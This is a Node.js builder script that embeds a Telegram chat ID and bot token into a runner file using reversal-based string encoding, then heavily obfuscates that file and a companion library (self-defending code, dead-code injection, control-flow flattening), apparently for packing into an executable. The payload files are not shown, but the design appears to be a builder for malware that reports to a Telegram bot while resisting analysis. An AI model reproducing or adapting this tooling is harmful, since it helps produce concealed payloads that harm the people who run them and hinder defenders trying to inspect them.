const fs = require('fs')
const path = require('path')
const JavaScriptObfuscator = require('javascript-obfuscator')

const argv = process.argv.slice(2)

const helpMsg = 'Usage: node builder.js <chat_id> <token>'
if (argv[0] === '--help' || argv[0] === '-h') {
  console.log(helpMsg)
  return
}
if (argv.length < 2) {
  console.error(`Error: Pass the Telegram chat ID and token as arguments\n${helpMsg}`)
  return
}

const libPath = path.join(__dirname, 'lib.js')
const runnerPath = path.join(__dirname, 'runner.js')

const outputDir = path.join(__dirname, 'obfuscated')
const outputLibPath = path.join(outputDir, 'lib.js')
const outputRunnerPath = path.join(outputDir, 'runner.js')

let libCode = fs.readFileSync(libPath, 'utf8')
let runnerCode = fs.readFileSync(runnerPath, 'utf8')

const chatId = argv[0]
const token = argv[1]

// Replace data
const replaced =
  `let c = '${`${chatId.split('').reverse().join(',')}+${token.split('').reverse().join('~')}`
    .split('')
    .reverse()
    .join('#')}';` +
  `run(c.split('#').reverse().join('').split('+')[0].split(',').reverse().join(''), c.split('#').reverse().join('').split('+')[1].split('~').reverse().join('')`

runnerCode = runnerCode.replace(/run\(\'.*?\', \'.*?\'/g, replaced)

const options = {
  compact: true,
  controlFlowFlattening: true,
  controlFlowFlatteningThreshold: 1,
  deadCodeInjection: true,
  deadCodeInjectionThreshold: 1,
  identifierNamesGenerator: 'hexadecimal',
  renameGlobals: true,
  selfDefending: true,
  splitStrings: true,
  splitStringsChunkLength: 2,
  stringArray: true,
  // stringArrayEncoding: ['base64'], // makes it crash when packed with pkg
  stringArrayThreshold: 0.9,
  target: 'node',
  transformObjectKeys: true,
  ignoreImports: true,
  // disableConsoleOutput: true,
  numbersToExpressions: true,
  stringArrayCallsTransform: true,
  stringArrayRotate: true,
  stringArrayShuffle: true,
  stringArrayWrappersCount: 5,
  stringArrayWrappersChainedCalls: true,
  stringArrayWrappersParametersMaxCount: 5,
  stringArrayWrappersType: 'function',
  unicodeEscapeSequence: true
}

fs.writeFileSync(outputLibPath, JavaScriptObfuscator.obfuscate(libCode, options).getObfuscatedCode(), 'utf8')
fs.writeFileSync(outputRunnerPath, JavaScriptObfuscator.obfuscate(runnerCode, options).getObfuscatedCode(), 'utf8')

console.log(`Obfuscated files saved to ${outputDir}`)
